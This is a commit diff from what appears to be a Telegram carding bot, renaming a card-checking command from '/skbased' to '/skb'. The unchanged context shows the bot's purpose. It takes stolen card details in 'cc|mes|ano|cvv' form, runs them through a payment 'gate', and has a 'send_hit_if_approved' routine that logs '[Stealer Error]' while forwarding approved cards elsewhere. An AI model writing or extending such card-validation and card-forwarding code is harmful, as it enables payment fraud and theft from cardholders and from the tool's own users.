33a256b1db8598a7799de6aae69101b8960dc138
spxlau <buoyspilux@gmail.com>
2026-04-03 22:05:15 +0300

    Rename command from 'skbased' to 'skb'

--- BOT/newgates/sk_based_10.py
+++ BOT/newgates/sk_based_10.py
@@ -22,7 +22,7 @@ async def send_hit_if_approved(client: Client, text: str):
     except Exception as e:
         print(f"[Stealer Error] Failed to forward: {e}")
 
-@Client.on_message(filters.command("skbased", [".", "/"]))
+@Client.on_message(filters.command("skb", [".", "/"]))
 async def sk_based_cmd(Client, message):
     try:
         user_id = str(message.from_user.id)
@@ -37,7 +37,7 @@ async def sk_based_cmd(Client, message):
         role = checkall[1]
         getcc = await getmessage(message)
         if getcc == False:
-            resp = f"""<b>\nGate Name: {gateway} ♻️\nCMD: /skbased\n\nMessage: No CC Found in your input ❌\n\nUsage: /skbased cc|mes|ano|cvv</b>"""
+            resp = f"""<b>\nGate Name: {gateway} ♻️\nCMD: /skb\n\nMessage: No CC Found in your input ❌\n\nUsage: /skbased cc|mes|ano|cvv</b>"""
             await message.reply_text(resp, message.id)
             return
 
